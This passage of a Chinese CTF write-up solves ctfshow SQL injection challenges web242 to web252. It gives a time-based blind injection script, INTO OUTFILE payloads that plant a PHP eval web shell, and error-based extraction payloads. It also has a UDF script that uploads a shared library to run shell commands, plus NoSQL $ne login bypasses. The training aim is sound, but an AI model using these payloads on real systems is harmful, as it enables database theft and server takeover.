</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">60</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nb">min</span><span class="p">,</span><span class="nb">max</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">128</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="n">j</span> <span class="o">=</span> <span class="nb">min</span> <span class="o">+</span> <span class="p">(</span><span class="nb">max</span><span class="o">-</span><span class="nb">min</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nb">min</span> <span class="o">==</span> <span class="n">j</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">            <span class="nb">str</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># 爆表名</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="c1"># payload = {</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="c1">#     &#39;id&#39;: f&#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.03),1)#&#39;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="c1"># }</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="c1"># 爆列</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="c1"># payload = {</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="c1">#     &#39;id&#39;: f&#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;),{i},1))&lt;{j},sleep(0.03),1)#&#34;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="c1"># }</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="c1"># 爆值</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select group_concat(flag) from flag),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&lt;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,sleep(0.03),1)#&#34;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="n">sub</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="k">if</span> <span class="n">sub</span> <span class="o">&gt;=</span> <span class="mf">0.2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="nb">max</span> <span class="o">=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="nb">min</span> <span class="o">=</span> <span class="n">j</span>
</span></span></code></pre></div><p>为什么sleep设定的是0.03，但是超时时间是大于0.2呢</p>
<p>那是因为要对所有记录都算一遍 if</p>
<p>那我们怎么测试这个时间呢，这里放一个大佬的脚本</p>
<p><a href="https://hextuff.dev/2021/07/29/ctfshow-web-getting-started-sql-injection/">Practice - CTFSHOW WEB入门 SQL注入篇</a></p>
<pre tabindex="0"><code>url = &#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php&#39;


def test2() -&gt; float:
    rand = random.random()
    time_s = time.time()
    _ = requests.post(url,data={&#34;id&#34;: f&#34;if({1 if rand &gt; 0.5 else 0},sleep(0.05),0)&#34;})
    time_e = time.time()
    return (rand &gt; 0.5, time_e - time_s)

print([test() for _ in range(30)])
</code></pre><p>我测出来的结果</p>
<pre tabindex="0"><code>[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)]
</code></pre><p>在false和true之间选取一个合适的值即可，目的是能够进行区分，我这里选取了0.2</p>
<h4 id="文件注入">文件注入<a hidden class="anchor" aria-hidden="true" href="#文件注入">#</a></h4>
<h4 id="web242">web242<a hidden class="anchor" aria-hidden="true" href="#web242">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//备份表
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from ctfshow_user into outfile &#39;/var/www/html/dump/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span></code></pre></div><pre tabindex="0"><code>outfile的语法

SELECT ... INTO OUTFILE &#39;file_name&#39;
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY &#39;string&#39;]//分隔符
        [[OPTIONALLY] ENCLOSED BY &#39;char&#39;]
        [ESCAPED BY &#39;char&#39;]
    ]
    [LINES
        [STARTING BY &#39;string&#39;]
        [TERMINATED BY &#39;string&#39;]
    ]

----------------------------------------------------
“OPTION”参数为可选参数选项，其可能的取值有：

FIELDS TERMINATED BY &#39;字符串&#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

FIELDS ENCLOSED BY &#39;字符&#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

FIELDS OPTIONALLY ENCLOSED BY &#39;字符&#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

FIELDS ESCAPED BY &#39;字符&#39;：设置转义字符，只能为单个字符。默认值为“\”。

LINES STARTING BY &#39;字符串&#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

LINES TERMINATED BY &#39;字符串&#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
</code></pre><p>漏洞的注入点是由于数据库的导出功能</p>
<p><img alt="image-20250218160941925" loading="lazy" src="./assets/image-20250218160941925.png"></p>
<p>根据这个我们可以写入一句话木马</p>
<p>payload:</p>
<pre tabindex="0"><code>filename=1.php&#39; LINES STARTING BY &#39;&lt;?php eval($_POST[1]);?&gt;&#39;#
</code></pre><p><img alt="image-20250218161133251" loading="lazy" src="./assets/image-20250218161133251.png"></p>
<p><img alt="image-20250218161332604" loading="lazy" src="./assets/image-20250218161332604.png"></p>
<h4 id="web243">web243<a hidden class="anchor" aria-hidden="true" href="#web243">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//备份表
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from ctfshow_user into outfile &#39;/var/www/html/dump/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//过滤了php
</span></span></span></code></pre></div><p>尝试一下.user.ini文件包含</p>
<pre tabindex="0"><code>filename=.user.ini&#39; lines starting by &#39;auto_prepend_file=1.txt\n&#39;%23
filename=1.txt&#39; lines starting by &#39;&lt;?=eval($_POST[1])?&gt;&#39;%23
</code></pre><p><img alt="image-20250218165925067" loading="lazy" src="./assets/image-20250218165925067.png"></p>
<h4 id="报错注入">报错注入<a hidden class="anchor" aria-hidden="true" href="#报错注入">#</a></h4>
<p><a href="https://blog.csdn.net/2401_89233381/article/details/144308798">新手小白入门——SQL注入之报错注入_sql注入报错注入-CSDN博客</a></p>
<h4 id="web244">web244<a hidden class="anchor" aria-hidden="true" href="#web244">#</a></h4>
<pre tabindex="0"><code>sql语句

  //备份表
  $sql = &#34;select id,username,pass from ctfshow_user where id = &#39;&#34;.$id.&#34;&#39; limit 1;&#34;;
      
返回逻辑

  //无过滤
</code></pre><p>updatexml报错注入</p>
<p>payload</p>
<pre tabindex="0"><code>/api/?id=&#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = &#39;ctfshow_flag&#39; limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = &#39;ctfshow_flag&#39; limit 1, 1), 0x7e), 1)%23
/api/?id=&#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23
#ctfshow{89982b11-5c7d-4215-a78
/api/?id=&#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23
#9-a9f8ecc8f1b1}
# 数据长度有限制，可以使用substr来截取


//ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1}
</code></pre><h4 id="web245">web245<a hidden class="anchor" aria-hidden="true" href="#web245">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">过滤updatexml</span>
</span></span></code></pre></div><p>extractvalue报错注入</p>
<p>payload</p>
<pre tabindex="0"><code>查数据库名：id=&#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23

爆表名：id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23
//ctfshow_flagsa

爆字段名：id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#34;ctfshow_flagsa&#34;))))%23
//flag1

爆数据：
id=&#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23
id=&#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23

//ctfshow{41446106-c47e-434d-a0c0-16ee43375249}
</code></pre><h4 id="web246">web246<a hidden class="anchor" aria-hidden="true" href="#web246">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">过滤updatexml</span> <span class="nx">extractvalue</span>
</span></span></code></pre></div><p>floor报错注入</p>
<p>原理：<a href="https://blog.csdn.net/miraclehw/article/details/129250360">SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客</a></p>
<pre tabindex="0"><code>#获取表名
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取列名
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#39;ctfshow_flags&#39;  limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23

#获取数据
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags  limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23
</code></pre><h4 id="web247">web247<a hidden class="anchor" aria-hidden="true" href="#web247">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="c1"></span>  <span class="nx">过滤updatexml</span> <span class="nx">extractvalue</span> <span class="nx">floor</span>
</span></span></code></pre></div><p>这道题floor函数也被ban掉了</p>
<p>根据floor报错注入的原理，其实我们可以知道，之所以会出现错误主要是因为用floor对rand(0)*2进行取整，目的输出011011&hellip;的结果，而既然这样我们只需要找一个同样能进行取整的函数来代替floor就ok了</p>
<p>除了floor之外，我们还能使用round，ceil等</p>
<p>payload</p>
<pre tabindex="0"><code>查表 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database()  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
查列 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=&#39;ctfshow_flagsa&#39;  limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
查数据 
1&#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa  limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23
</code></pre><h4 id="web248">web248<a hidden class="anchor" aria-hidden="true" href="#web248">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  
</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select id,username,pass from ctfshow_user where id = &#39;&#34;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">&#34;&#39; limit 1;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤,
</span></span></span></code></pre></div><p>UDF注入</p>
<p><a href="https://blog.csdn.net/Myon5/article/details/142146339">ctfshow-web入门-sql注入-web248-UDF 注入_ctfshow web248-CSDN博客</a></p>
<p>我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：</p>
<blockquote>
<p>MySQL &lt; 5.0	导出路径随意；
5.0 &lt;= MySQL&lt; 5.1	需要导出至目标服务器的系统目录（如：c:/windows/system32/）
5.1 &lt; MySQL	必须导出到MySQL安装目录下的lib\plugin文件夹下</p></blockquote>
<p>堆叠注入查版本</p>
<pre tabindex="0"><code>/api/?id=0&#39;;select version();%23
</code></pre><p><img alt="image-20250218215235779" loading="lazy" src="./assets/image-20250218215235779.png"></p>
<p>大于5.1，接着要查目录路径</p>
<pre tabindex="0"><code>/api/?id=0&#39;;select @@plugin_dir;%23
</code></pre><p><img alt="image-20250218215447848" loading="lazy" src="./assets/image-20250218215447848.png"></p>
<pre tabindex="0"><code>/usr/lib/mariadb/plugin
</code></pre><p>拿到路径，我们接下来就可以传入我们的恶意so文件了</p>
<p>sqlmap中有已经写好的 udf 文件</p>
<p>如，lib_mysqludf_sys_64.so</p>
<p><img alt="image-20250218220305454" loading="lazy" src="./assets/image-20250218220305454.png"></p>
<p>但是由于get传参有长度限制，我们需要进行分段传参</p>
<p>放一个国外大佬的脚本，将udf文件分段上传后再进行合并即可</p>
<pre tabindex="0"><code>import requests
url=&#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/&#34;
udf=&#34;&#34;
udfs=[]
for i in range(0,len(udf),5000):
    udfs.append(udf[i:i+5000])
#写入多个文件中
for i in udfs:
    url1=url+f&#34;?id=1&#39;;SELECT &#39;{i}&#39; into dumpfile &#39;/tmp/&#34;+str(udfs.index(i))+&#34;.txt&#39;%23&#34;
    requests.get(url1)

#合并文件生成so文件
url2=url+&#34;?id=1&#39;;SELECT unhex(concat(load_file(&#39;/tmp/0.txt&#39;),load_file(&#39;/tmp/1.txt&#39;),load_file(&#39;/tmp/2.txt&#39;),load_file(&#39;/tmp/3.txt&#39;))) into dumpfile &#39;/usr/lib/mariadb/plugin/hack.so&#39;%23&#34;
requests.get(url2)

#创建自定义函数并执行恶意命令
requests.get(url+&#34;?id=1&#39;;create function sys_eval returns string soname &#39;hack.so&#39;%23&#34;)
r=requests.get(url+&#34;?id=1&#39;;select sys_eval(&#39;cat /f*&#39;)%23&#34;)
print(r.text)
</code></pre><h4 id="web249">web249<a hidden class="anchor" aria-hidden="true" href="#web249">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">
</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="c1">//无
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>  <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$memcache</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">      
</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl">
</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span></code></pre></div><p><img alt="image-20250218221510397" loading="lazy" src="./assets/image-20250218221510397.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?id[]=flag
</code></pre><h4 id="web250">web250<a hidden class="anchor" aria-hidden="true" href="#web250">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p><a href="https://blog.csdn.net/Myon5/article/details/142187219">ctfshow-web入门-sql注入（web249-web253）nosql 注入_ctfshow web250-CSDN博客</a></p>
<p><img alt="image-20250218222341349" loading="lazy" src="./assets/image-20250218222341349.png"></p>
<p>在这些操作符中，$ne 就是我们在<strong>重言式注入</strong>中需要利用到的那个，它的作用是将不等于指定值的数据都查询出来，比如 $ne=1 时就是将所有不等于 1 的数据都查询出来。</p>
<p>所以payload就是</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$ne]=1
</code></pre><p>环境好像有点问题（？）前两次一直查不出来</p>
<h4 id="web251">web251<a hidden class="anchor" aria-hidden="true" href="#web251">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;登陆成功&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nx">array_push</span><span class="p">(</span><span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span> <span class="nv">$flag</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>同样是</p>
<pre tabindex="0"><code>username[$ne]=1&amp;password[$ne]=1
</code></pre><p><img alt="image-20250218225117048" loading="lazy" src="./assets/image-20250218225117048.png"></p>
<p>继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag</p>
<p>可能flag在其他用户的密码里，我们禁用admin</p>
<pre tabindex="0"><code>username[$ne]=admin&amp;password[$ne]=1
</code></pre><p><img alt="image-20250218225555688" loading="lazy" src="./assets/image-20250218225555688.png"></p>
<p>拿到flag</p>
<h4 id="web252">web252<a hidden class="anchor" aria-hidden="true" href="#web252">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">sql语句</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nv">$query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">MongoDB\Driver\Query</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nv">$cursor</span> <span class="o">=</span> <span class="nv">$manager</span><span class="o">-&gt;</span><span class="na">executeQuery</span><span class="p">(</span><span class="s1">&#39;ctfshow.ctfshow_user&#39;</span><span class="p">,</span> <span class="nv">$query</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">toArray</span><span class="p">();</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">返回逻辑</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//无过滤
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$cursor</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
